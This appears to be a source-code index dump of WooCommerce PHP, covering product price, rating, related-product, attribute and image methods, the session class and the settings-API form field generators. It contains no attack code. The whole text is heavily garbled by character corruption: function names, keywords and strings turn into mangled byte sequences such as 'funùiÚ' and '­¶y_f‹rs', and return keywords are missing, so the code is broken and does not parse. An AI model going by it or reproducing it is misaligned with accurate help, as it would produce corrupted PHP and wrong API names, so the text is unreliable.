Ğ
$di¥Ïy_»guÏr_´iû
, 
__
( 'Free!', 'woocommerce' ) );

912 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_ä“_§Ë_´iû_html', 
$´iû
, 
$this
 );

916 
	g$´iû
 = 
__
( 'Free!', 'woocommerce' );

918 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_ä“_´iû_html', 
$´iû
, 
$this
 );

923  
­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû_html', 
$´iû
, 
$this
 );

931 
public
 
funùiÚ
 
	$g‘_´iû_html_äom_‹xt
() {

932  '<¥ª cÏss="äom">' . 
	`_x
( 'From:', 'min_price', 'woocommerce' ) . ' </span>';

933 
	}
}

942 
public
 
funùiÚ
 
	$g‘_´iû_html_äom_to
Ğ
$äom
, 
$to
 ) {

943  '<d–>' . ( ( 
	`is_num”ic
Ğ
$äom
 ) ) ? 
	`wc_´iû
Ğ$äom ) : $äom ) . '</d–> <šs>' . ( ( is_num”icĞ
$to
 ) ) ? wc_price( $to ) : $to ) . '</ins>';

944 
	}
}

952 
public
 
funùiÚ
 
	$g‘_x_şass
() {

953  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_x_şass', 
$this
->
x_şass
, $this );

954 
	}
}

962 
public
 
funùiÚ
 
	$g‘_x_¡©us
() {

963  
$this
->
x_¡©us
;

964 
	}
}

972 
public
 
funùiÚ
 
	$g‘_av”age_¿tšg
() {

973 iàĞ
çl£
 ==ğĞ
$av”age_¿tšg
 = 
	`g‘_Œªs›Á
Ğ'wc_av”age_¿tšg_' . 
$this
->
id
 ) ) ) {

975 
glob®
 
$wpdb
;

977 
$av”age_¿tšg
 = '';

978 
$couÁ
 = 
$this
->
	`g‘_¿tšg_couÁ
();

980 iàĞ
$couÁ
 > 0 ) {

982 
$¿tšgs
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
("

983 
SELECT
 
	`SUM
(
m‘a_v®ue
è
FROM
 
$wpdb
->
comm’tm‘a


984 
LEFT
 
JOIN
 
$wpdb
->
comm’ts
 
ON
 $wpdb->
comm’tm‘a
.
comm’t_id
 = $wpdb->comm’ts.
comm’t_ID


985 
WHERE
 
m‘a_key
 = 'rating'

986 
AND
 
comm’t_po¡_ID
 = %
d


987 
AND
 
comm’t_­´oved
 = '1'

988 
AND
 
m‘a_v®ue
 > 0

991 
$av”age_¿tšg
 = 
	`numb”_fÜm©
Ğ
$¿tšgs
 / 
$couÁ
, 2 );

995 
	`£t_Œªs›Á
Ğ'wc_av”age_¿tšg_' . 
$this
->
id
, 
$av”age_¿tšg
, 
YEAR_IN_SECONDS
 );

998  
$av”age_¿tšg
;

999 
	}
}

1007 
public
 
funùiÚ
 
	$g‘_¿tšg_couÁ
() {

1008 iàĞ
çl£
 ==ğĞ
$couÁ
 = 
	`g‘_Œªs›Á
Ğ'wc_¿tšg_couÁ_' . 
$this
->
id
 ) ) ) {

1010 
glob®
 
$wpdb
;

1012 
$couÁ
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
("

1013 
SELECT
 
	`COUNT
(
m‘a_v®ue
è
FROM
 
$wpdb
->
comm’tm‘a


1014 
LEFT
 
JOIN
 
$wpdb
->
comm’ts
 
ON
 $wpdb->
comm’tm‘a
.
comm’t_id
 = $wpdb->comm’ts.
comm’t_ID


1015 
WHERE
 
m‘a_key
 = 'rating'

1016 
AND
 
comm’t_po¡_ID
 = %
d


1017 
AND
 
comm’t_­´oved
 = '1'

1018 
AND
 
m‘a_v®ue
 > 0

1021 
	`£t_Œªs›Á
Ğ'wc_¿tšg_couÁ_' . 
$this
->
id
, 
$couÁ
, 
YEAR_IN_SECONDS
 );

1024  
$couÁ
;

1025 
	}
}

1034 
public
 
funùiÚ
 
	$g‘_¿tšg_html
Ğ
$¿tšg
 = 
nuÎ
 ) {

1036 iàĞ! 
	`is_num”ic
Ğ
$¿tšg
 ) ) {

1037 
$¿tšg
 = 
$this
->
	`g‘_av”age_¿tšg
();

1040 iàĞ
$¿tšg
 > 0 ) {

1042 
$¿tšg_html
 = '<div cÏss="¡¬-¿tšg"™Ë="' . 
	`¥rštf
Ğ
	`__
Ğ'R©ed % ouˆoà5', 'woocomm”û' ), 
$¿tšg
 ) . '">';

1044 
$¿tšg_html
 .ğ'<¥ª styË="width:' . ( ( 
$¿tšg
 / 5 ) * 100 ) . '%"><¡rÚg cÏss="¿tšg">' . $¿tšg . '</¡rÚg> ' . 
	`__
( 'out of 5', 'woocommerce' ) . '</span>';

1046 
$¿tšg_html
 .= '</div>';

1048  
$¿tšg_html
;

1052 
	}
}

1061 
public
 
funùiÚ
 
	$g‘_up£Îs
() {

1062  (
¬¿y
è
	`maybe_un£rŸlize
Ğ
$this
->
up£Î_ids
 );

1063 
	}
}

1071 
public
 
funùiÚ
 
	$g‘_üoss_£Îs
() {

1072  (
¬¿y
è
	`maybe_un£rŸlize
Ğ
$this
->
üoss£Î_ids
 );

1073 
	}
}

1085 
public
 
funùiÚ
 
g‘_ÿ‹gÜ›s
Ğ
$£p
 = ', ', 
$befÜe
 = '', 
$aá”
 = '' ) {

1086  
g‘_the_‹rm_li¡
Ğ
$this
->
id
, '´oduù_ÿt', 
$befÜe
, 
$£p
, 
$aá”
 );

1098 
public
 
funùiÚ
 
g‘_gs
Ğ
$£p
 = ', ', 
$befÜe
 = '', 
$aá”
 = '' ) {

1099  
g‘_the_‹rm_li¡
Ğ
$this
->
id
, '´oduù_g', 
$befÜe
, 
$£p
, 
$aá”
 );

1108 
public
 
funùiÚ
 
	$g‘_shpšg_şass
() {

1109 iàĞ! 
$this
->
shpšg_şass
 ) {

1110 
$şas£s
 = 
	`g‘_the_‹rms
Ğ
$this
->
id
, 'product_shipping_class' );

1112 iàĞ
$şas£s
 && ! 
	`is_wp_”rÜ
( $classes ) ) {

1113 
$this
->
shpšg_şass
 = 
	`cu¼’t
Ğ
$şas£s
 )->
¦ug
;

1115 
$this
->
shpšg_şass
 = '';

1119  
$this
->
shpšg_şass
;

1120 
	}
}

1128 
public
 
funùiÚ
 
	$g‘_shpšg_şass_id
() {

1129 iàĞ! 
$this
->
shpšg_şass_id
 ) {

1130 
$şas£s
 = 
	`g‘_the_‹rms
Ğ
$this
->
id
, 'product_shipping_class' );

1132 iàĞ
$şas£s
 && ! 
	`is_wp_”rÜ
( $classes ) ) {

1133 
$this
->
shpšg_şass_id
 = 
	`cu¼’t
Ğ
$şas£s
 )->
‹rm_id
;

1135 
$this
->
shpšg_şass_id
 = 0;

1138  
	`absšt
Ğ
$this
->
shpšg_şass_id
 );

1139 
	}
}

1148 
public
 
funùiÚ
 
	$g‘_»Ï‹d
Ğ
$lim™
 = 5 ) {

1149 
glob®
 
$wpdb
;

1152 
$gs_¬¿y
 = 
	`¬¿y
(0);

1153 
$ÿts_¬¿y
 = 
	`¬¿y
(0);

1156 
$‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$this
->
id
, 'product_tag' );

1157 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

1158 
$gs_¬¿y
[] = 
$‹rm
->
‹rm_id
;

1162 
$‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$this
->
id
, 'product_cat' );

1163 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

1164 
$ÿts_¬¿y
[] = 
$‹rm
->
‹rm_id
;

1168 iàĞĞ
$ÿts_¬¿y
 ) =ğ1 && Ğ
$gs_¬¿y
 ) == 1 ) {

1169  
	`¬¿y
();

1173 
$ÿts_¬¿y
 = 
	`¬¿y_m­
( 'absint', $cats_array );

1174 
$gs_¬¿y
 = 
	`¬¿y_m­
( 'absint', $tags_array );

1175 
$exşude_ids
 = 
	`¬¿y_m­
Ğ'absšt', 
	`¬¿y_m”ge
Ğ
	`¬¿y
Ğ0, 
$this
->
id
 ), $this->
	`g‘_up£Îs
() ) );

1178 
$qu”y
['fields'] = "SELECT DISTINCT ID FROM {$wpdb->posts}…";

1179 
$qu”y
['join'] = " INNER JOIN {$wpdb->postmeta}…m ON (…m.post_id =….ID AND…m.meta_key='_visibility' )";

1180 
$qu”y
['join'] .= " INNER JOIN {$wpdb->term_relationships}r ON (p.ID =r.object_id)";

1181 
$qu”y
['join'] .= " INNER JOIN {$wpdb->term_taxonomy}t ON (tr.term_taxonomy_id =t.term_taxonomy_id)";

1182 
$qu”y
['join'] .= " INNER JOIN {$wpdb->terms} ON (t.term_id =t.term_id)";

1184 iàĞ
	`g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) === 'yes' ) {

1185 
$qu”y
['join'] .= " INNER JOIN {$wpdb->postmeta}…m2 ON (…m2.post_id =….ID AND…m2.meta_key='_stock_status' )";

1188 
$qu”y
['where'] = " WHERE 1=1";

1189 
$qu”y
['where'] .= " AND….post_status = 'publish'";

1190 
$qu”y
['where'] .= " AND….post_type = 'product'";

1191 
$qu”y
['wh”e'] .ğ" AND….ID NOT IN ( " . 
	`im¶ode
Ğ',', 
$exşude_ids
 ) . " )";

1192 
$qu”y
['where'] .= " AND…m.meta_value IN ( 'visible', 'catalog' )";

1194 iàĞ
	`g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) === 'yes' ) {

1195 
$qu”y
['where'] .= " AND…m2.meta_value = 'instock'";

1198 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_»Ï‹d_po¡s_»Ï‹_by_ÿ‹gÜy', 
Œue
 ) ) {

1199 
$qu”y
['wh”e'] .ğ" AND (t.xÚomy = '´oduù_ÿt' AND.‹rm_id IN ( " . 
	`im¶ode
Ğ',', 
$ÿts_¬¿y
 ) . " ) )";

1200 
$ªdÜ
 = 'OR';

1202 
$ªdÜ
 = 'AND';

1206 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_»Ï‹d_po¡s_»Ï‹_by_g', 
Œue
 ) ) {

1207 
$qu”y
['wh”e'] .ğ" {$ªdÜ} (t.xÚomy = '´oduù_g' AND.‹rm_id IN ( " . 
	`im¶ode
Ğ',', 
$gs_¬¿y
 ) . " ) )";

1208 
$qu”y
['wh”e'] .ğ" AND….ID NOT IN ( " . 
	`im¶ode
Ğ',', 
$exşude_ids
 ) . " )";

1211 
$qu”y
['orderby'] = " ORDER BY RAND()";

1212 
$qu”y
['lim™s'] = " LIMIT " . 
	`absšt
Ğ
$lim™
 ) . " ";

1215 
$»Ï‹d_po¡s
 = 
$wpdb
->
	`g‘_cŞ
Ğ
	`im¶ode
Ğ' ', 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_»Ï‹d_po¡s_qu”y', 
$qu”y
 ) ) );

1217  
$»Ï‹d_po¡s
;

1218 
	}
}

1227 
public
 
funùiÚ
 
	$g‘_©Œibu‹
Ğ
$©Œ
 ) {

1228 
$©Œibu‹s
 = 
$this
->
	`g‘_©Œibu‹s
();

1230 
$©Œ
 = 
	`§n™ize_t™Ë
( $attr );

1232 iàĞ
	`is£t
Ğ
$©Œibu‹s
[ 
$©Œ
 ] ) || isset( $attributes[ 'pa_' . $attr ] ) ) {

1234 
$©Œibu‹
 = 
	`is£t
Ğ
$©Œibu‹s
[ 
$©Œ
 ] ) ? $attributes[ $attr ] : $attributes[ 'pa_' . $attr ];

1236 iàĞ
$©Œibu‹
['is_taxonomy'] ) {

1238  
	`im¶ode
Ğ', ', 
	`wc_g‘_´oduù_‹rms
Ğ
$this
->
id
, 
$©Œibu‹
['Çme'], 
	`¬¿y
( 'fields' => 'names' ) ) );

1242  
$©Œibu‹
['value'];

1249 
	}
}

1257 
public
 
funùiÚ
 
	$g‘_©Œibu‹s
() {

1258  (
¬¿y
è
	`maybe_un£rŸlize
Ğ
$this
->
´oduù_©Œibu‹s
 );

1259 
	}
}

1267 
public
 
funùiÚ
 
	$has_©Œibu‹s
() {

1268 iàĞĞ
$this
->
	`g‘_©Œibu‹s
() ) > 0 ) {

1269 
	`fÜ—ch
 ( 
$this
->
	`g‘_©Œibu‹s
(è
as
 
$©Œibu‹
 ) {

1270 iàĞ
	`is£t
Ğ
$©Œibu‹
['is_visible'] ) && $attribute['is_visible'] ) {

1271  
Œue
;

1275  
çl£
;

1276 
	}
}

1284 
public
 
funùiÚ
 
	$’abË_dim’siÚs_di¥Ïy
() {

1285  
	`­¶y_f‹rs
Ğ'wc_´oduù_’abË_dim’siÚs_di¥Ïy', 
Œue
 );

1286 
	}
}

1294 
public
 
funùiÚ
 
	$has_dim’siÚs
() {

1295  
$this
->
	`g‘_dim’siÚs
(è? 
Œue
 : 
çl£
;

1296 
	}
}

1304 
public
 
funùiÚ
 
	$has_weight
() {

1305  
$this
->
	`g‘_weight
(è? 
Œue
 : 
çl£
;

1306 
	}
}

1314 
public
 
funùiÚ
 
	$g‘_dim’siÚs
() {

1315 iàĞ! 
$this
->
dim’siÚs
 ) {

1316 
$dim’siÚs
 = 
	`¬¿y
();

1318 iàĞ
$this
->
Ëngth
 ) {

1319 
$dim’siÚs
[] = 
$this
->
Ëngth
;

1322 iàĞ
$this
->
width
 ) {

1323 
$dim’siÚs
[] = 
$this
->
width
;

1326 iàĞ
$this
->
height
 ){

1327 
$dim’siÚs
[] = 
$this
->
height
;

1330 
$this
->
dim’siÚs
 = 
	`im¶ode
Ğ' x ', 
$dim’siÚs
 );

1332 iàĞ! 
	`em±y
Ğ
$this
->
dim’siÚs
 ) ) {

1333 
$this
->
dim’siÚs
 .ğ' ' . 
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' );

1337  
$this
->
dim’siÚs
;

1338 
	}
}

1346 
public
 
funùiÚ
 
	$li¡_©Œibu‹s
() {

1347 
	`wc_g‘_‹m¶©e
Ğ'sšgË-´oduù/´oduù-©Œibu‹s.php', 
	`¬¿y
(

1348 '´oduù' => 
$this


1350 
	}
}

1356 
public
 
funùiÚ
 
	$g‘_image_id
() {

1357 iàĞ
	`has_po¡_thumbÇ
Ğ
$this
->
id
 ) ) {

1358 
$image_id
 = 
	`g‘_po¡_thumbÇ_id
Ğ
$this
->
id
 );

1359 } 
	`–£if
 ( ( 
$·»Á_id
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$this
->
id
 ) ) && 
	`has_po¡_thumbÇ
( $parent_id ) ) {

1360 
$image_id
 = 
	`g‘_po¡_thumbÇ_id
Ğ
$·»Á_id
 );

1362 
$image_id
 = 0;

1364  
$image_id
;

1365 
	}
}

1374 
public
 
funùiÚ
 
g‘_image
Ğ
$size
 = 'shİ_thumbÇ', 
$©Œ
 = 
	$¬¿y
() ) {

1375 
$image
 = '';

1377 iàĞ
	`has_po¡_thumbÇ
Ğ
$this
->
id
 ) ) {

1378 
$image
 = 
	`g‘_the_po¡_thumbÇ
Ğ
$this
->
id
, 
$size
, 
$©Œ
 );

1379 } 
	`–£if
 ( ( 
$·»Á_id
 = 
	`wp_g‘_po¡_·»Á_id
Ğ
$this
->
id
 ) ) && 
	`has_po¡_thumbÇ
( $parent_id ) ) {

1380 
$image
 = 
	`g‘_the_po¡_thumbÇ
Ğ
$·»Á_id
, 
$size
, 
$©Œ
 );

1382 
$image
 = 
	`wc_¶aûhŞd”_img
Ğ
$size
 );

1385  
$image
;

1386 
	}
}

1395 
public
 
funùiÚ
 
	$g‘_fÜm©‹d_Çme
() {

1397 iàĞ
$this
->
	`g‘_sku
() ) {

1398 
$id’tif›r
 = 
$this
->
	`g‘_sku
();

1400 
$id’tif›r
 = '#' . 
$this
->
id
;

1403  
	`¥rštf
Ğ
	`__
Ğ'% &ndash; %s', 'woocomm”û' ), 
$id’tif›r
, 
$this
->
	`g‘_t™Ë
() );

1404 
	}
}

	@includes/abstracts/abstract-wc-session.php

1 <?
php


11 
ab¡¿ù
 cÏs 
	cWC_SessiÚ
 {

14 
´Ùeùed
 
	m$_cu¡om”_id
;

17 
´Ùeùed
 
	m$_d©a
 = 
¬¿y
();

20 
´Ùeùed
 
	m$_dœty
 = 
çl£
;

29 
public
 
funùiÚ
 
	$__g‘
Ğ
$key
 ) {

30  
$this
->
	`g‘
Ğ
$key
 );

41 
public
 
funùiÚ
 
	$__£t
Ğ
$key
, 
$v®ue
 ) {

42 
$this
->
	`£t
Ğ
$key
, 
$v®ue
 );

43 
	}
}

52 
public
 
funùiÚ
 
	$__is£t
Ğ
$key
 ) {

53  
	`is£t
Ğ
$this
->
_d©a
[ 
	`§n™ize_t™Ë
Ğ
$key
 ) ] );

54 
	}
}

63 
public
 
funùiÚ
 
	$__un£t
Ğ
$key
 ) {

64 iàĞ
	`is£t
Ğ
$this
->
_d©a
[ 
$key
 ] ) ) {

65 
	`un£t
Ğ
$this
->
_d©a
[ 
$key
 ] );

66 
$this
->
_dœty
 = 
Œue
;

68 
	}
}

77 
public
 
funùiÚ
 
	$g‘
Ğ
$key
, 
$deçuÉ
 = 
nuÎ
 ) {

78 
$key
 = 
	`§n™ize_key
( $key );

79  
	`is£t
Ğ
$this
->
_d©a
[ 
$key
 ] ) ? 
	`maybe_un£rŸlize
Ğ$this->_d©a[ $key ] ) : 
$deçuÉ
;

80 
	}
}

88 
public
 
funùiÚ
 
	$£t
Ğ
$key
, 
$v®ue
 ) {

89 
$this
->
_d©a
[ 
	`§n™ize_key
Ğ
$key
 ) ] = 
	`maybe_£rŸlize
Ğ
$v®ue
 );

90 
$this
->
_dœty
 = 
Œue
;

91 
	}
}

99 
public
 
funùiÚ
 
	$g‘_cu¡om”_id
() {

100  
$this
->
_cu¡om”_id
;

101 
	}
}

	@includes/abstracts/abstract-wc-settings-api.php

1 <?
php


11 
ab¡¿ù
 cÏs 
	cWC_S‘tšgs_API
 {

14 
public
 
	m$¶ugš_id
 = 'woocommerce_';

17 
public
 
	m$£‰šgs
 = 
¬¿y
();

20 
public
 
	m$fÜm_f›lds
 = 
¬¿y
();

23 
public
 
	m$”rÜs
 = 
¬¿y
();

26 
public
 
	m$§n™ized_f›lds
 = 
¬¿y
();

38 
public
 
funùiÚ
 
	$admš_İtiÚs
() { ?>

39 <
h3
><?
php
 
	`echo
 ( ! 
	`em±y
Ğ
$this
->
m‘hod_t™Ë
 ) ) ? $this->m‘hod_t™Ë : 
	`__
( 'Settings', 'woocommerce' ) ; ?></h3>

41 <?
php
 
	`echo
 ( ! 
	`em±y
Ğ
$this
->
m‘hod_desütiÚ
 ) ) ? 
	`w·utİ
( $this->method_description ) : ''; ?>

43 <
bË
 
şass
="form-table">

44 <?
php
 
$this
->
	`g’”©e_£‰šgs_html
(); ?>

45 </
bË
><?
php


58 
public
 
funùiÚ
 
	$š™_fÜm_f›lds
(è{
	}
}

65 
public
 
funùiÚ
 
	$g‘_fÜm_f›lds
() {

66  
	`­¶y_f‹rs
Ğ'woocomm”û_£‰šgs_­i_fÜm_f›lds_' . 
$this
->
id
, $this->
fÜm_f›lds
 );

67 
	}
}

77 
public
 
funùiÚ
 
	$´oûss_admš_İtiÚs
() {

78 
$this
->
	`v®id©e_£‰šgs_f›lds
();

80 iàĞ
	`couÁ
Ğ
$this
->
”rÜs
 ) > 0 ) {

81 
$this
->
	`di¥Ïy_”rÜs
();

82  
çl£
;

84 
	`upd©e_İtiÚ
Ğ
$this
->
¶ugš_id
 . $this->
id
 . '_£‰šgs', 
	`­¶y_f‹rs
Ğ'woocomm”û_£‰šgs_­i_§n™ized_f›lds_' . $this->id, $this->
§n™ized_f›lds
 ) );

85 
$this
->
	`š™_£‰šgs
();

86  
Œue
;

88 
	}
}

97 
public
 
funùiÚ
 
	$di¥Ïy_”rÜs
(è{
	}
}

111 
public
 
funùiÚ
 
	$š™_£‰šgs
() {

113 
$this
->
£‰šgs
 = 
	`g‘_İtiÚ
Ğ$this->
¶ugš_id
 . $this->
id
 . '_£‰šgs', 
nuÎ
 );

115 iàĞ! 
$this
->
£‰šgs
 || ! 
	`is_¬¿y
( $this->settings ) ) {

117 
$this
->
£‰šgs
 = 
	`¬¿y
();

120 iàĞ
$fÜm_f›lds
 = 
$this
->
	`g‘_fÜm_f›lds
() )

121 
	`fÜ—ch
 ( 
$fÜm_f›lds
 
as
 
$k
 => 
$v
 )

122 
$this
->
£‰šgs
[ 
$k
 ] = 
	`is£t
Ğ
$v
['default'] ) ? $v['default'] : '';

125 iàĞ
$this
->
£‰šgs
 && 
	`is_¬¿y
( $this->settings ) ) {

126 
$this
->
£‰šgs
 = 
	`¬¿y_m­
Ğ
	`¬¿y
( $this, 'format_settings' ), $this->settings );

127 
$this
->
’abËd
 = 
	`is£t
Ğ$this->
£‰šgs
['enabled'] ) && $this->settings['enabled'] == 'yes' ? 'yes' : 'no';

129 
	}
}

141 
public
 
funùiÚ
 
	$g‘_İtiÚ
Ğ
$key
, 
$em±y_v®ue
 = 
nuÎ
 ) {

142 iàĞ
	`em±y
Ğ
$this
->
£‰šgs
 ) )

143 
$this
->
	`š™_£‰šgs
();

146 iàĞ! 
	`is£t
Ğ
$this
->
£‰šgs
[ 
$key
 ] ) ) {

147 
$fÜm_f›lds
 = 
$this
->
	`g‘_fÜm_f›lds
();

148 
$this
->
£‰šgs
[ 
$key
 ] = 
	`is£t
Ğ
$fÜm_f›lds
[ $key ]['default'] ) ? $form_fields[ $key ]['default'] : '';

151 iàĞ! 
	`is_nuÎ
Ğ
$em±y_v®ue
 ) && 
	`em±y
Ğ
$this
->
£‰šgs
[ 
$key
 ] ) )

152 
$this
->
£‰šgs
[ 
$key
 ] = 
$em±y_v®ue
;

154  
$this
->
£‰šgs
[ 
$key
 ];

155 
	}
}

164 
public
 
funùiÚ
 
	$fÜm©_£‰šgs
Ğ
$v®ue
 ) {

165  
	`is_¬¿y
Ğ
$v®ue
 ) ? $value : $value;

166 
	}
}

180 
public
 
funùiÚ
 
	$g’”©e_£‰šgs_html
Ğ
$fÜm_f›lds
 = 
çl£
 ) {

181 iàĞ! 
$fÜm_f›lds
 )

182 
$fÜm_f›lds
 = 
$this
->
	`g‘_fÜm_f›lds
();

184 
$html
 = '';

185 
	`fÜ—ch
 ( 
$fÜm_f›lds
 
as
 
$k
 => 
$v
 ) {

186 iàĞ! 
	`is£t
Ğ
$v
['type'] ) || ( $v['type'] == '' ) )

187 
$v
['type'] = 'text';

189 iàĞ
	`m‘hod_exi¡s
Ğ
$this
, 'g’”©e_' . 
$v
['type'] . '_html' ) ) {

190 
$html
 .ğ
$this
->{'g’”©e_' . 
$v
['ty³'] . '_html'}Ğ
$k
, $v );

192 
$html
 .ğ
$this
->{'g’”©e_‹xt_html'}Ğ
$k
, 
$v
 );

196 
echo
 
$html
;

197 
	}
}

204 
public
 
funùiÚ
 
	$g‘_toŞt_html
Ğ
$d©a
 ) {

205 iàĞ
$d©a
['desc_t'] ==ğ
Œue
 ) {

206 
$t
 = 
$d©a
['description'];

207 } 
	`–£if
 ( ! 
	`em±y
Ğ
$d©a
['desc_tip'] ) ) {

208 
$t
 = 
$d©a
['desc_tip'];

210 
$t
 = '';

213  
$t
 ? '<img cÏss="h–p_t" d©a-t="' . 
	`esc_©Œ
Ğ$t ) . '" src="' . 
	`WC
()->
	`¶ugš_u¾
() . '/assets/images/help.png" height="16" width="16" />' : '';

214 
	}
}

221 
public
 
funùiÚ
 
	$g‘_desütiÚ_html
Ğ
$d©a
 ) {

222 iàĞ
$d©a
['desc_t'] ==ğ
Œue
 ) {

223 
$desütiÚ
 = '';

224 } 
	`–£if
 ( ! 
	`em±y
Ğ
$d©a
['desc_tip'] ) ) {

225 
$desütiÚ
 = 
$d©a
['description'];

226 } 
	`–£if
 ( ! 
	`em±y
Ğ
$d©a
['description'] ) ) {

227 
$desütiÚ
 = 
$d©a
['description'];

229 
$desütiÚ
 = '';

232  
$desütiÚ
 ? '<°şass="desütiÚ">' . 
	`wp_k£s_po¡
( $description ) . '</p>' . "\n" : '';

233 
	}
}

240 
public
 
funùiÚ
 
	$g‘_cu¡om_©Œibu‹_html
Ğ
$d©a
 ) {

241 
$cu¡om_©Œibu‹s
 = 
	`¬¿y
();

243 iàĞ! 
	`em±y
Ğ
$d©a
['cu¡om_©Œibu‹s'] ) && 
	`is_¬¿y
( $data['custom_attributes'] ) )

244 
	`fÜ—ch
 ( 
$d©a
['cu¡om_©Œibu‹s'] 
as
 
$©Œibu‹
 => 
$©Œibu‹_v®ue
 )

245 
$cu¡om_©Œibu‹s
[] = 
	`esc_©Œ
Ğ
$©Œibu‹
 ) . '="' .ƒsc_©ŒĞ
$©Œibu‹_v®ue
 ) . '"';

247  
	`im¶ode
Ğ' ', 
$cu¡om_©Œibu‹s
 );

248 
	}
}

259 
public
 
funùiÚ
 
	$g’”©e_‹xt_html
Ğ
$key
, 
$d©a
 ) {

260 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

261 
$deçuÉs
 = 
	`¬¿y
(

263 'di§bËd' => 
çl£
,

268 'desc_t' => 
çl£
,

270 'cu¡om_©Œibu‹s' => 
	`¬¿y
()

273 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

275 
	`ob_¡¬t
();

277 <
Œ
 
v®ign
="top">

278 <
th
 
scİe
="row" 
şass
="titledesc">

279 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

280 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

281 </
th
>

282 <
td
 
şass
="forminp">

283 <
f›ld£t
>

284 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

285 <
šput
 
şass
="šput-‹xˆ»guÏr-špuˆ<?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
ty³
="<?ph°echØesc_©ŒĞ$d©a['ty³'] ); ?>" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" 
v®ue
="<?ph°echØesc_©ŒĞ$this->g‘_İtiÚĞ$key ) ); ?>" 
¶aûhŞd”
="<?ph°echØesc_©ŒĞ$d©a['¶aûhŞd”'] ); ?>" <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> <?ph°
echo
 
$this
->
	`g‘_cu¡om_©Œibu‹_html
( $data ); ?> />

286 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

287 </
f›ld£t
>

288 </
td
>

289 </
Œ
>

290 <?
php


291  
	`ob_g‘_ş—n
();

292 
	}
}

303 
public
 
funùiÚ
 
	$g’”©e_´iû_html
Ğ
$key
, 
$d©a
 ) {

304 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

305 
$deçuÉs
 = 
	`¬¿y
(

307 'di§bËd' => 
çl£
,

312 'desc_t' => 
çl£
,

314 'cu¡om_©Œibu‹s' => 
	`¬¿y
()

317 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

319 
	`ob_¡¬t
();

321 <
Œ
 
v®ign
="top">

322 <
th
 
scİe
="row" 
şass
="titledesc">

323 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

324 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

325 </
th
>

326 <
td
 
şass
="forminp">

327 <
f›ld£t
>

328 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

329 <
šput
 
şass
="wc_šput_´iû iÅut-‹xˆ»guÏr-špuˆ<?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
ty³
="‹xt" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" 
v®ue
="<?ph°echØesc_©ŒĞwc_fÜm©_loÿlized_´iûĞ$this->g‘_İtiÚĞ$key ) ) ); ?>" 
¶aûhŞd”
="<?ph°echØesc_©ŒĞ$d©a['¶aûhŞd”'] ); ?>" <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> <?ph°
echo
 
$this
->
	`g‘_cu¡om_©Œibu‹_html
( $data ); ?> />

330 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

331 </
f›ld£t
>

332 </
td
>

333 </
Œ
>

334 <?
php


335  
	`ob_g‘_ş—n
();

336 
	}
}

347 
public
 
funùiÚ
 
	$g’”©e_decim®_html
Ğ
$key
, 
$d©a
 ) {

348 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

349 
$deçuÉs
 = 
	`¬¿y
(

351 'di§bËd' => 
çl£
,

356 'desc_t' => 
çl£
,

358 'cu¡om_©Œibu‹s' => 
	`¬¿y
()

361 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

363 
	`ob_¡¬t
();

365 <
Œ
 
v®ign
="top">

366 <
th
 
scİe
="row" 
şass
="titledesc">

367 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

368 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

369 </
th
>

